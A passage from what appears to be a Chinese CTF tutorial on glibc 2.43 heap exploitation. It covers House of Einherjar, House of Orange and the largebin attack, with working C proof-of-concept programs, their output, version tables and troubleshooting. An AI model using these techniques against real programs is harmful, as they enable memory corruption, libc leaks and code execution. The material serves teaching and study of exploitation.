malloc(0x6d0) = 0x31e01030（伪造块+0x10 = 0x31e01030，F 的数据区内）
写入读回：EINHERJAR PWNED（F 与 p 重叠，改这里 = 改已分配的 F）
```

逐步对照：off-by-null 把 V 的 size 从 `0x101` 清成 `0x100`——大小不变、PREV_INUSE 消失；prev_size 写的距离是 `0x5e0`（V 的 chunk 到 F 数据区里伪造块的距离）；free 走合并路径（`tcache[0x100]` 已满），unlink 过三道检查，合并块从伪造块起步、总量 `0x6e0`，进 unsorted——伪造块 fd 槽里的 main_arena 地址是凭据；同尺寸请求 `malloc(0x6d0)`（nb = 0x6e0）把合并块原样交付，==mem 落在 F 的数据区中间==——F 还在分配状态，新块与它重叠，编辑任何一方都在改同一片内存。

### 6.3 堆外落点的隐藏关卡

伪造块的位置，原始打法常选在堆外（bss、栈）——==现代版本上这条走不通==：合并块的 size 是"伪造块到 victim 的距离 + victim 大小"，伪造块离堆越远这个值越大；unsorted 遍历对每个块核对 size 不超过本 arena 的 system_mem（当前堆总大小，典型 0x21000 量级）。伪造块放 bss 时这个距离动辄几十 MB，下一次 malloc 在 unsorted 遍历里当场终止（`malloc(): invalid size (unsorted)`）；free 本身倒是完成了——fd 已经写进伪造块，但此后==任何一次分配都活不过遍历==，堆等于废了。

> [!warning] Einherjar 的落点必须离堆头够近
> 合并块 size ≤ system_mem 是硬约束。把伪造块选在堆内另一块的 user data 里（距离几百字节），一切检查都过；选在 bss/栈，得到的是"一次 unsorted 插入 + 一条废掉的堆"。现代堆题里 Einherjar 的落点因此都在堆内——它提供的其实是"把新块的起点搬到任意堆内偏移"，与 [[P13-基础堆漏洞|P13]] 的重叠路线同宗。

### 6.4 现代地位

Einherjar 的两个写坏动作（清 PREV_INUSE、写 prev_size）至今没有被专门检查拦住，==构造在 2.43 上仍然成立==——本章演示就是证明。但它的条件清单（装满 tcache、unlink 自洽、next 头合法、距离受限）比 [[P13-基础堆漏洞|P13]] 的 off-by-null 重叠路线长得多：重叠路线只需要"清位后让 free 把两块并成一个"，不必伪造块、不必伺候 unlink。做 off-by-null 题时先走 P13 的路线；Einherjar 的思想（合并起点由数据决定）在需要"新块出现在指定偏移"的布局题里才登场。

## 7. House of Orange：没有 free 的 free

### 7.1 核心思想：让 sysmalloc 替你 free

题目常给这样的限制：程序只分配、不释放，House of Spirit 没有下手机会，tcache 路线没有原料。House of Orange 的回答：==堆管理器自己有一条会"释放"块的路径——sysmalloc==。[[P12-glibc堆管理机制#4. malloc 的主干流程|P12 第 4 节]]第 6 步：top 不够用时 sysmalloc 负责扩堆；扩堆若不连续（旧 top 的尾和新的内存起点对不上），旧 top 会被就地释放——缩掉头部余量、进 unsorted bin。==不调用 free，堆上多出一个待分配的大块==，这就是 Orange 的前半程，也是无 free 题里制造 libc 泄露和"可用块"的来源。

触发它需要把 top 的 size 改小——改小后的值必须伺候两组检查：

**sysmalloc 入口的断言**（伪造 size 逼出扩堆时核对，2.43 的原文）：

```text
Fatal glibc error: malloc.c (sysmalloc): assertion failed:
(old_top == initial_top (av) && old_size == 0)
|| ((unsigned long) (old_size) >= MINSIZE
    && prev_inuse (old_top)
    && ((unsigned long) old_end & (pagesize - 1)) == 0)
```

翻译成条件：伪造 size ≥ 0x20、保留 PREV_INUSE 位、且 ==top 地址 + 伪造 size 仍是页对齐的==——所以只按整页数缩减（`真实 size − n × 0x1000`），old_end 自然还落在页边界上。

**sysmalloc 释放旧 top 时**，_int_free 的全套检查照跑：旧 top 之后那格必须有合法的 size 槽。旧 top 内部是清零页，size 槽为 0 过不了关——用同一个溢出原语把 top 内部统一填成 `0x21`（0x20 | PREV_INUSE），==每一格都是一个合法的 next 头==，old_end 落在哪里都对。

### 7.2 完整演示：旧 top 进 unsorted

```c
/* orange.c —— House of Orange 演示（x86-64 Linux，glibc 2.43）
 * 原理：把 top 的 size 改小到"仍以页对齐收尾、但比真实余量少几页"，
 * 随后一次超出 top 余量的 malloc 触发 sysmalloc 扩堆；扩堆不连续时，
 * 旧 top 被释放进 unsorted——全程没有 free 调用。
 * 请求尺寸压在 mmap 阈值 0x20000 之下，逼 sysmalloc 走 brk 扩堆。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    setbuf(stdout, NULL);

    /* 1. c1 紧邻 top；其数据末尾 +8 就是 top 的 size 槽 */
    char *c1 = malloc(0x18);
    unsigned long top = (unsigned long)c1 + 0x10;   /* c1 的 chunk(0x20) 之后 */
    unsigned long real = *(unsigned long *)(top + 8) & ~0xFUL;
    printf("top = %p  真实余量 = %#lx\n", (void *)top, real);

    /* 2. 漏洞原语（长溢出）：top 内部每格填 0x21（合法 next 头），
          再从原始值直接减 5 页——PREV_INUSE 位保留（sysmalloc 的断言查它） */
    unsigned long forged = *(unsigned long *)(top + 8) - 0x5000;
    for (unsigned long off = 0x10; off < real; off += 8)
        *(unsigned long *)(top + off) = 0x21;
    *(unsigned long *)(top + 8) = forged;
    printf("[1] top size 改为 %#lx（old_end = %p，页对齐；内部已填 0x21）\n",
           forged, (void *)(top + (forged & ~0xFUL)));

    /* 3. 一次超出伪造余量的 malloc：触发 sysmalloc，旧 top 被释放进 unsorted */
    void *p1 = malloc(forged + 8);                  /* nb = forged + 0x10 > forged */
    printf("[2] 触发 malloc(%#lx) = %p\n", forged + 8, p1);

    /* 4. 旧 top 的 fd/bk 已指向 main_arena → 它在 unsorted 链上 */
    unsigned long fd = *(unsigned long *)(top + 0x10);
    printf("[3] 旧 top(%p) 的 fd = %#lx（%s）\n", (void *)top, fd,
           fd > 0x100000000UL ? "libc 地址：unsorted 链上" : "未变化");

    /* 5. 再要一块：unsorted 里的旧 top 被切分交付 */
    void *p2 = malloc(0x4f8);
    printf("[4] malloc(0x4f8) = %p（旧 top 的 mem = %p）\n", p2, (void *)(top + 0x10));
    if (p2 == (void *)(top + 0x10))
        puts("[5] 旧 top 经 unsorted 重新分配 —— ORANGE PWNED");
    return 0;
}
```

输出（本机 glibc 2.43）：

```text
top = 0x8867020  真实余量 = 0x20fe0
[1] top size 改为 0x1bfe1（old_end = 0x8883000，页对齐；内部已填 0x21）
[2] 触发 malloc(0x1bfe9) = 0x8888010
[3] 旧 top(0x8867020) 的 fd = 0x703b98212ac8（libc 地址：unsorted 链上）
[4] malloc(0x4f8) = 0x8867030（旧 top 的 mem = 0x8867030）
[5] 旧 top 经 unsorted 重新分配 —— ORANGE PWNED
```

逐步对照：伪造 size `0x1bfe1` 是从原始值 `0x20fe1` 直接减 5 页——低位的 PREV_INUSE 原样保留，`top + 0x1bfe0` 仍是页边界（断言三条件全过）；请求 `0x1bfe9` 的 nb 是 `0x1bff0`，大于伪造余量、又压在 mmap 阈值 0x20000 之下，正好逼 sysmalloc 走 brk 扩堆；扩堆不连续（old_end 在真实堆尾往回 5 页处），旧 top 被缩格释放——`[3]` 里它的 fd 已是 main_arena 内的地址，==unsorted 链上的 libc 泄露凭据到手==；`[4]` 再要一块，unsorted 切分把它原样交付。==全程没有一次 free 调用，堆上却完成了一轮完整的"释放—再分配"==。

### 7.3 旧版完整链与它的死亡

Orange 得名的原始战场在 2.23 时代：这套"旧 top 进 unsorted"只是前半程，完整链还要走两步——

1. **unsorted bin attack**：unsorted 链上的块被摘除时，分配器执行 `bck->fd = bin`，把链表头地址写进"块的 bk 指向的任意地址"——利用它把 `_IO_list_all` 改写成 main_arena 内的值（那时不需要知道 libc 基址）；
2. **FSOP**：遍历到伪造的 FILE 结构时经 `__overflow` 槽位调用 `system`。

第二步的接棒者今天还活着（[[P16-FSOP与HouseofApple2|P16]] 整章），==死的是第一步的桥==：2.29 起 unsorted 遍历核对双向一致性（`bck->fd != victim` 则报 `malloc(): unsorted double linked list corrupted`）——2.27 的 libc 里还没有这条报错串，2.43 有。==没有泄露也能写 `_IO_list_all` 的通道自此关闭==，原版 Orange 的"无泄露全链"随之作废。

### 7.4 现代延续

前半程（7.2 的演示）在 2.43 上完整可用：无 free 约束下制造"旧 top 进 unsorted"，一次性拿到 libc 泄露 + 一个可再分配的大块。后半程的执行落点换成了现代打法：泄露到手之后走 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]的落点决策，把伪造 FILE 挂进 `_IO_list_all`，触发与调用链完全按 [[P16-FSOP与HouseofApple2#5. House of Apple 2：借合法跳表拿 shell|P16 第 5 节]]的 House of Apple 2 打法执行——==Orange 负责"没有 free 也能有块、有泄露"，Apple 2 负责"有任意写之后的控制流"==，两章合起来就是原版 Orange 的现代等价物。

## 8. largebin attack：largebin 上的任意写

### 8.1 它兑换的是什么

House 系列之外，堆上还有一类"遍历写入"技术：不伪造块、不偷链表，而是==借分配器自己的一次指针写入，把一个值送进任意地址==。最老的一位是 unsorted bin attack——伪造 unsorted 块的 bk，让遍历把链表头（一个 libc 地址）写进任意位置；它在 2.29 被双向一致性检查杀死（7.3 从版本表推过结论）。它的后继就是本节的 **largebin attack**：借 largebin 的插入逻辑，==把被插入块的 chunk 地址（一个堆地址）写进任意目标==。

两个技术写入的值都不是常数——==落点完全可控，写入值只能定性选择==，这决定了它们的用法：改"只需要一个大数或一个堆内地址"的字段，精确写值仍由 [[P14-tcache与fastbin利用#3. tcache poisoning：完整主线|P14 第 3 节]]的 tcache poisoning 负责。两类原语的搭配见 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]的落点决策。

### 8.2 写入点：按"最小块"插入 largebin 的四行

[[P12-glibc堆管理机制#3.3 largebin：按大小排序的双链|P12 3.3]]讲过 largebin 的双链加 nextsize 环。unsorted 遍历把大块搬进 largebin 时，插入逻辑分三种情况：bin 为空（nextsize 自环）、比当前最小块还小（绕过 nextsize 环直接挂到环尾）、其余（沿 nextsize 环找插入点）。写入点在第二种情况里——glibc 2.43 `_int_malloc` 的原文（变量名照抄源码，victim 是刚从 unsorted 取出的块）：

```c
/* fwd 指向 bin 链表头，bck->bk 是当前最小的块 */
if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
  {
    fwd = bck;
    bck = bck->bk;
    if (__glibc_unlikely (fwd->fd->bk_nextsize->fd_nextsize != fwd->fd))
      malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");

    victim->fd_nextsize = fwd->fd;
    victim->bk_nextsize = fwd->fd->bk_nextsize;
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
  }
```

逐行读：`fwd->fd` 是 bin 里当前最小的块（记作 A）；第二行赋值把 ==A 的 bk_nextsize== 读进 victim；最后一行连等号的右半 `victim->bk_nextsize->fd_nextsize = victim` 解引用刚读来的值写入。==写入发生在刚插入的块身上，伪造却要下在先住进 bin 的 A 身上==——把 A 的 bk_nextsize 改成 `目标 − 0x20`，最后一行就把 victim 的 chunk 地址写进目标。fd_nextsize 在 chunk + 0x20、bk_nextsize 在 + 0x28（[[P12-glibc堆管理机制#2. chunk：管理器的账本|P12 第 2 节]]的字段布局），`目标 − 0x20` 正是让 fake 块的 fd_nextsize 槽落在目标上。

写进赋值上方的核对（`fwd->fd->bk_nextsize->fd_nextsize != fwd->fd`）是 2.43 里真实生效的检查：它解引用伪造值，要求 fake 块的 fd_nextsize 指回 A。8.3 的演示用"预填"应付它，8.4 的对照组展示不预填的下场。

### 8.3 完整演示（glibc 2.43）

演示程序保留 free 之后的悬垂指针——真实题目里这就是 [[P13-基础堆漏洞|P13]] 的 UAF/edit 原语。布局与各步骤：

| 步骤 | 动作 | 堆上的效果 |
| ---- | ---- | ---- |
| 铺垫 | `free(malloc(0x28))` | tcache 结构体提前诞生（它在本版本里第一次 free 才分配，[[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]]） |
| 布局 | A（chunk 0x450）、隔断、B（chunk 0x440）、隔断 | A、B 同一个 largebin 档（chunk 0x440–0x470 共用一档），A 大 B 小 |
| 加工 | `free(a)` 后 `malloc(0x508)` | A 搬进 largebin，bin 内唯一：fd_nextsize、bk_nextsize 都是自环 |
| 伪造 | `a[3] = &target − 0x20` | A 的 bk_nextsize 指向伪造成分 |
| 预填 | `target = A 的 chunk 地址` | 应付插入路径的 fd_nextsize 核对 |
| 触发 | `free(b)` 后 `malloc(0x508)` | B 比 A 小，走"最小块"插入——target 被写成 B 的 chunk 地址 |

尺寸的选取各有原因：A、B 都要超出 tcache 小档的覆盖上限（chunk 0x410，[[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]），free 才会直接进 unsorted；两块又要在同一档里且 A 大 B 小，插入才走"最小块"分支。

```c
/* lbattack.c —— largebin attack 演示（x86-64 Linux，glibc 2.43）
 * 演示程序保留 free 后的悬垂指针（真实题里这就是 UAF/edit 原语）。
 * 目标：把全局变量 target 改写成 B 的 chunk 地址（一个堆地址）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

unsigned long long target;    /* 任意写的落点 */

int main(void) {
    setbuf(stdout, NULL);

    void *warm = malloc(0x28);
    free(warm);                    /* tcache 结构体在第一次 free 时诞生 */

    uint64_t *a = malloc(0x448);   /* A：chunk 0x450 */
    malloc(0x38);                  /* 隔断：0x40 档，从 top 新切 */
    uint64_t *b = malloc(0x438);   /* B：chunk 0x440，与 A 同 bin、更小 */
    malloc(0x38);                  /* 隔开 top */
    printf("a = %p（chunk %p）\nb = %p（chunk %p）\ntarget @ %p\n",
           (void *)a, (void *)(a - 2), (void *)b, (void *)(b - 2), (void *)&target);

    free(a);
    malloc(0x508);                 /* 加工 unsorted：A 搬进 largebin（bin 内唯一，nextsize 自环） */
    printf("[1] A 已进 largebin：a->fd = %#lx，a->bk_nextsize = %#lx（自环）\n", a[0], a[3]);

    /* 漏洞原语：悬垂写，把 A 的 bk_nextsize 指向 target - 0x20 */
    a[3] = (uint64_t)&target - 0x20;
    /* 插入检查核对 fake->fd_nextsize == bin 内最小块：先在 target 预填 A 的 chunk 地址 */
    target = (uint64_t)(a - 2);
    printf("[2] a->bk_nextsize = %#lx，target 预填 = %#lx\n", a[3], target);

    free(b);
    malloc(0x508);                 /* B 按"bin 内最小块"插入：target 被写成 B 的 chunk 地址 */
    printf("[3] target = %#llx\n", target);
    if (target == (uint64_t)(b - 2))
        puts("[4] LARGE BIN ATTACK：target 已被写成 B 的 chunk 地址");
    return 0;
}
```

```bash
gcc -O0 -g -fno-pie -no-pie lbattack.c -o lbattack && ./lbattack
```

输出：

```text
a = 0x3e78f340（chunk 0x3e78f330）
b = 0x3e78f7d0（chunk 0x3e78f7c0）
target @ 0x404048
[1] A 已进 largebin：a->fd = 0x7a95cd012ec8，a->bk_nextsize = 0x3e78f330（自环）
[2] a->bk_nextsize = 0x404028，target 预填 = 0x3e78f330
[3] target = 0x3e78f7c0
[4] LARGE BIN ATTACK：target 已被写成 B 的 chunk 地址
```

逐步对照：`[1]` 里 A 的 fd 已指向 main_arena 内的 bin 链表头，bk_nextsize 是自环——bin 内唯一块的合法形态；`[2]` 把自环改成指向 `0x404028`（= target − 0x20），并在 target 预填 A 的 chunk 地址；`[3]` 里 target 从预填值变成 `0x3e78f7c0`——正是 `b − 0x10`，==B 的 chunk 地址被分配器亲手写进了任意位置==。

预填这一步值得多说一句：插入核对要求 fake 块的 fd_nextsize 指回 A，而 fake 块的 fd_nextsize 槽恰好就是 target 自己——==预填的值会被攻击本身覆盖==，等于"用一次已知值的写，换一次任意值的写"。它依赖的只是"target 当前内容可控或可预测"，在 UAF 题里通常免费。

### 8.4 布局前提：几个会提前引爆的坑

每条布局前提都对应一种真实的死法，逐一列出：

> [!warning] B 的 chunk 不能落在 tcache 小档覆盖内（≤ 0x410）
> 落在内的话 free 直接进 tcache，unsorted 里根本没有 B，后面两步全部落空。A、B 选 0x450/0x440 而不是更常见的 0x420/0x410，就是因为后者有一块落进 tcache——同档（chunk 0x440–0x470 共用一档）里能同时满足"A 大 B 小、都超 0x410"的组合并不多。

> [!warning] 隔断块不能复用 warm 让出的那一档
> 演示开头 free 掉的 0x28 小块正躺在 `tcache[0x30]` 里，随后的 `malloc(0x28)` 若用作隔断，会把这块领回来——隔断落位到堆头，==A 与 B 直接相邻==。此时 free(B) 的后向合并发现"前一块还空着"（A 在 largebin 里就是空块），一路 `unlink_chunk(A)`——A 的 nextsize 环已被伪造，当场报 `corrupted double-linked list (not small)`。隔断换一个档位（如 0x38）从 top 新切即可。

> [!warning] B 不能与 top 相邻
> 道理同上：free 发现"下一块是 top"就直接并入 top，unsorted 里同样没有 B。最后一道隔断就是防这个。

> [!info]- tcache 结构体的懒分配也可能来捣乱
> [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]记过：tcache 结构体在第一次 free 时才分配。攻击途中若有某次 free 触发这次懒分配，那次 0x300 的请求会按最佳适配在各个 bin 里找块——largebin 里的 A（0x450）恰好装得下，==分配器会把伪造中的 A 摘出来交付==，unlink 核对当场终止进程。演示开头的 `free(malloc(0x28))` 就是把这次懒分配提前消化掉。

不预填的下场，一枚对照实验（源码同 8.3，删掉预填那一行）：

```bash
gcc -O0 -g -fno-pie -no-pie lbnopreset.c -o lbnopreset && ./lbnopreset
```

输出：

```text
[1] A 已进 largebin：a->fd = 0x7099b9012ec8，a->bk_nextsize = 0x103f5330（自环）
[2] a->bk_nextsize = 0x404028，target 预填 = 0
malloc(): largebin double linked list corrupted (nextsize)
```

插入核对解引用伪造值、读到 0，与 bin 内最小块对不上，进程终止——==8.2 的检查真实生效，预填不是装饰==。

### 8.5 版本条件：老的对照组与检查的年代

unsorted bin attack 的死法，用同布局的对照实验当面看一遍（只伪造 unsorted 块的 bk）：

```c
/* lbunsorted.c —— 对照：unsorted bin attack（x86-64 Linux，glibc 2.43） */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

unsigned long long target;

int main(void) {
    setbuf(stdout, NULL);

    void *warm = malloc(0x28);
    free(warm);

    uint64_t *b = malloc(0x438);
    malloc(0x38);                      /* 隔断 */
    printf("b = %p（chunk %p）\ntarget @ %p\n",
           (void *)b, (void *)(b - 2), (void *)&target);

    free(b);
    printf("[0] free 后：b->fd = %#lx，b->bk = %#lx\n", b[0], b[1]);
    b[1] = (uint64_t)&target - 0x10;   /* 老打法：单处伪造 unsorted 块的 bk */
    printf("[1] b->bk = %#lx（指向 target - 0x10）\n", b[1]);

    malloc(0x508);                     /* 触发 unsorted 遍历 */
    printf("[2] target = %#llx\n", target);
    return 0;
}
```

输出：

```text
b = 0x119d7340（chunk 0x119d7330）
target @ 0x404040
[0] free 后：b->fd = 0x700913412ac8，b->bk = 0x700913412ac8
[1] b->bk = 0x404030（指向 target - 0x10）
malloc(): unsorted double linked list corrupted
```

`[0]` 里 B 的 fd、bk 都指向 main_arena——它确实在 unsorted 链上；伪造 bk 后的第一次遍历，双向核对（`bck->fd != victim`）当场终止。把版本口径收进一张表：

| 条件 | 2.27 | 2.43 | 依据 |
| ---- | ---- | ---- | ---- |
| unsorted 遍历的双向核对（`unsorted double linked list corrupted`） | 无 | 在场 | 7.3 的版本口径 ＋ 8.5 对照实验 ＋ 2.27 libc 的串比对 |
| largebin 插入路径的 nextsize 核对（`(nextsize)`） | 无 | 在场 | 8.4 的不预填对照 ＋ 串比对 |
| unlink 的 nextsize 环核对（`not small`） | 已有 | 在场 | 2.27 libc 同样有这串——极老 |
| tcache 小档覆盖 0x20–0x410、结构体懒分配 | —（无 tcache） | 在场 | [[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]] |

> [!info]- 把同一份源码放到 2.27 会怎样
> 按第 2.2 节的历史环境跑到 2.27 上：unsorted 的双向核对与 largebin 插入路径的核对都缺席——unsorted bin attack 的写入（链表头地址进 target）会真实发生，largebin attack 的==预填一步可以省掉==。读老题解时看到"unsorted bin attack 一处伪造写任意地址""largebin attack 只需一次伪造"，就是这个年代的口径；在 2.43 上按本节的布局前提补齐即可。

### 8.6 现代用途与落点

写入值是"一个堆地址"决定了它的角色：==largebin attack 负责把堆内地址种进关键位置，精确控制仍由别的原语完成==。两个常用方向：

- **"只需要变大/只需要非零"的字段**：堆地址是天文数字，拿去当尺寸、上限、计数一类的字段天然够用。老资料的经典落点 `mp_.tcache_bins`（把 tcache 表格上限改大）就属于这一类；
- **结构指针类字段**：把"指向某结构的指针"改指到可控的堆上，让伪造结构摆在堆里——FSOP 的前置写入（[[P16-FSOP与HouseofApple2#5. House of Apple 2：借合法跳表拿 shell|P16 第 5 节]]）常从这里取料。

做题时的选型顺序：手里若能直接 tcache poisoning（一处写加一次泄露，[[P14-tcache与fastbin利用#3. tcache poisoning：完整主线|P14 第 3 节]]），优先它；编辑原语只够"改已 free 大块的字段"时，本节是把堆地址种进任意位置的现成通道，落点按 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]的决策表选。

## 9. 汇总：五个 House 的版本坐标系

| House | 核心思想 | 原始适用版本 | 死因 / 现状 | 2.43 替代路径 |
| ---- | ---- | ---- | ---- | ---- |
| Spirit | 伪造 size 让 free 收编任意地址 | 2.x 全系（tcache 后检查面更小） | 活着 | 直接用；或 tcache poisoning |
| Force | top size = -1，任意距离搬迁 top | ≤ 2.28 | 2.29 起 `corrupted top size` + 请求上限拒绝 | 堆布局交给 [[P17-堆风水与通用利用思路\|P17]]；落点走 [[P14-tcache与fastbin利用\|P14]] 的链 |
| Lore | smallbin bk 伪造，两跳到伪造块 | 检查前（早于 2.23） | 检查极老；可行但五处写 | [[P14-tcache与fastbin利用#7. tcache stashing unlink attack：2.43 上依然成立\|P14 第 7 节]] stashing |
| Einherjar | 清 PREV_INUSE + prev_size 伪造，合并起点搬迁 | 2.x 全系（落点受 system_mem 约束） | 活着（堆内落点） | 简单场景走 [[P13-基础堆漏洞\|P13]] 的重叠路线 |
| Orange | 缩 top 逼 sysmalloc 释放旧 top | 全系前半程 | 前半活着；完整链死于 2.29（unsorted attack） | 前半 + 泄露 → [[P16-FSOP与HouseofApple2\|P16]] Apple 2 |

> [!note] 读老题解的换算法
> "改 top size → 巨型 malloc"（Force）→ 2.43 直接作废，别再试；"smallbin bk 伪造"（Lore）→ 若题目只给一处写，直接换 tcache poisoning，五处写的账在第 5.4 节；"伪造块放 bss/栈"（Spirit 例外，Einherjar 不行）→ Einherjar 的合并块 size 会超过 system_mem，落点搬回堆内；"unsorted bin attack 写 `_IO_list_all`"→ 2.29 起作废，改走泄露 + tcache poisoning 或第 8 节的 largebin attack；"free 7 个装满 tcache / 第 8 个进 fastbin"→ [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的表。所有 House 的"思想层"都不随版本失效，失效的是布点与步长。

> [!info]- House 家族的其他成员（与后续章节的分工）
> **House of Apple 1 / 2 / 3**：roderick01 的现代系列，借 stdio 的合法跳表完成任意写到控制流的兑换——第 2 型是 [[P16-FSOP与HouseofApple2|P16]] 的主线。**House of Banana / House of Cat**：攻击面移到 ld.so 的数据结构（`_rtld_global` 一族）与 exit 链，字段约束与 FILE 不同，入手点同样是"写一个结构体"。**House of Emma**：针对 exit 处理链的指针加密（[[P16-FSOP与HouseofApple2#1.2 任意分配之后，去哪找执行落点|P16 1.2]]的落点表里那行"加密的 exit handler"）构造伪造表项。它们的共同骨架与本章一致：==找一个"分配器/运行库会按字段解释的数据结构"，把字段的语义翻转成控制流==。掌握第 3 节到第 7 节的四段式读法，遇到新 House 按同一张清单拆即可。

## 10. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| free 一片全局数组，报 `free(): invalid pointer` | mem − 0x10 不是 0x10 的倍数（第 3.1 节）；伪造块起点与喂给 free 的参数都要按 chunk 视角对齐 |
| 伪造 size 写了，free 还是报 `free(): invalid size` | size 槽剥掉标志位后小于 0x20 或不是 0x10 的倍数（第 3.1 节）；`0x61`、`0x91` 这类"档位 + PREV_INUSE"是标准写法 |
| 自己编译 Spirit demo 时 gcc 报 `-Wfree-nonheap-object` | 编译器看见对静态对象 free（第 3.2 节的 note）；真实题目不受影响，忽略即可 |
| 老题解的 Force 步骤在本机直接 Aborted | `malloc(): corrupted top size`，2.29 起的检查（第 4.3 节）；这条路整体作废 |
| 历史环境的二进制报 `version 'GLIBC_2.xx' not found` | 新工具链编译的产物引用了新符号版本（第 2.2 节）；编译必须放进老容器做 |
| patchelf 之后运行报"required file not found" | `--set-interpreter` 的路径写错或 ld 文件不在；用绝对路径，并确认运行目录里有改名为 `libc.so.6` 的副本（第 2.2 节） |
| Lore 的伪造块 fd 写了 victim 还是报检查错误 | fd 存的是 **chunk 地址**（mem − 0x10），tcache 链的地址习惯在这里不适用（第 5.3 节） |
| Lore 第二跳交付的不是伪造块而是另一个真块 | smallbin 命中后的余块批量暂存在起作用：伪造块经 tcache 按 LIFO 转手，交付顺序看暂存顺序（第 5.3 节） |
| Lore 的暂存循环段错误、bk 是随机数或 0 | 伪造链的链尾 bk 没指回链表头，循环读到无效 bk 解引用（第 5.4 节的折叠框、[[P14-tcache与fastbin利用#7.4 一个值得记的坑：链表头认错之后\|P14 7.4]]） |
| Einherjar 的 free 成功了，之后所有 malloc 都报 `malloc(): invalid size (unsorted)` | 伪造块放太远，合并块 size 超过 system_mem（第 6.3 节）；落点搬回堆内 |
| Einherjar 在 free(V) 时报 `double free or corruption (!prev)` | V 的下一个 chunk 的 size 槽也被 off-by-null 清了低位——victim 的档位要选成 `0x…01`（如 0x101），清位后恰好等于原 size（第 6.2 节） |
| Orange 触发后报 sysmalloc 断言失败 | 伪造 size 没过三条件：按原始值减整页数（保留 PREV_INUSE）、old_end 保持页对齐（第 7.1 节） |
| Orange 的旧 top 释放时报 `free(): invalid next size (normal)` | 旧 top 内部的 next 头是 0：用溢出原语把 top 内部填成 0x21 再改 size（第 7.1 节） |
| Orange 的请求走了 mmap，什么都没发生 | 请求的 nb 超过 0x20000 阈值，sysmalloc 直接 mmap、不经过旧 top 释放路径（第 7.2 节）；缩减幅度调小 |
| largebin attack 的 free(B) 报 `corrupted double-linked list (not small)` | 隔断被 tcache 领走，A、B 直接相邻，free(B) 的后向合并 unlink 了伪造过的 A：隔断换一个 tcache 档位（8.4） |
| free(B) 后 unsorted 里没有 B | B 的 chunk 在 tcache 小档覆盖内（≤ 0x410），或紧邻 top 被直接并入：换档位、垫隔断（8.4） |
| 插入时报 `malloc(): largebin double linked list corrupted (nextsize)` | 最小插入路径核对 fake 块的 fd_nextsize：预填 target = A 的 chunk 地址（8.2、8.3） |

## 11. 配套练习与延伸阅读

> [!note] 实战任务：五个 House 各打一题
> 每题都按 [[P01-PWN导论与缓解机制全景#2. 利用链构建的五步流程|P1 第 2 节]]的五步流程走完整链，动笔前先在纸上写：这题的编辑原语喂给哪个 House、要伺候哪几条检查、2.43 上有没有替代路。
> ① **Spirit**：在 NSSCTF（nssctf.cn）或 BUUCTF（buuoj.cn）按"house of spirit"检索，挑一道题目环境带 free 参数可控的堆题——目标地址与 size 槽都要自己摆；
> ② **Force**：同平台按"house of force"检索一道 2.23/2.27 的老题，先按本章第 4 节在本地历史环境跑通 demo，再上远程——顺带体会"远程 libc 版本决定打法生死"；
> ③ **Lore**：把 how2heap 仓库的 house_of_lore 示例在本机 2.43 重写一遍，按第 5.4 节的账本数一遍写次数，再回答"为什么该题的官方解法是 poisoning"；
> ④ **Einherjar**：挑一道 off-by-null 题，先按 [[P13-基础堆漏洞|P13]] 的重叠路线解一遍，再按本章第 6 节把合并起点搬到指定偏移，对比两条路线的条件清单；
> ⑤ **Orange**：挑一道"只分配不释放"的堆题，把第 7.2 节的前半程做成 libc 泄露，后半接 [[P16-FSOP与HouseofApple2|P16]] 的 Apple 2 完成 getshell。
> ⑥ **largebin attack**：把第 8 节演示的落点换成题目给定的全局字段，体会"写入值是堆地址"对落点选择的限制；再对照 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]的落点表，说明什么场合该让位给 tcache poisoning。
> how2heap 仓库（shellphish，GitHub）按攻击技术组织最小示例，多数基于旧版 glibc，跑之前先对 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的版本表换算。

延伸阅读按用途分三档：

- **源码**：glibc 的 `malloc/malloc.c`——本章所有检查的出处都在这一个文件里：tcache 出口的两条检查、`corrupted top size`、smallbin 入口的 `bck->fd` 核对、暂存循环、unsorted 遍历的 size 与双向检查、sysmalloc 的断言。遇到本章没写的版本差异，源码是第一手资料。
- **社区资料**：shellphish 的 how2heap（GitHub）——每个 House 一份最小示例，与本章演示程序互为参照；House of Apple 系列原文（roderick01，看雪论坛 2022）；CTF Wiki 的堆部分适合当词汇表。老资料跑不通时，先查版本表，再按四段式的"死因"一栏对号入座。
- **后续章节**：无 free 题的完整利用 → [[P16-FSOP与HouseofApple2|P16]]（Apple 2 全链）；把本章的布局约束当成解题工具、多技术组合 → [[P17-堆风水与通用利用思路|P17]]；off-by-null 的重叠路线 → [[P13-基础堆漏洞|P13]]；tcache 与 fastbin 时代的兑换环节 → [[P14-tcache与fastbin利用|P14]]。
